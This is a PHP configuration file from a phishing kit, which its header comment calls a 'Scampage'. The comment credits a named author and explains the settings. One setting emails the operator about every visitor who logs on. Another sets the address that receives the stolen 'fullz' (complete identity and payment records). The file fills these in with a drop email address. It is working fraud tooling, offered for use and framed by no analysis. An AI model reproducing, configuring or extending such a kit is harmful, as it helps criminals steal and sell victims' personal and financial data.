<?php

/*
*Scampage made by Prskorum(@prskorum)
function:
	iplog: if you set to 1 you will get an email of every active user if set to 0 
		   you will recieve no emails when someone logs on. THIS IS NOT THE FULLZ PART.
	to: 
		Your email to recieve fullz 
	nameOfFullz:
		the name of your fullz
*/
$iplog = "1"; 
$to = "rpspam21@protonmail.com";
$nameOfFullz = "RP";
?>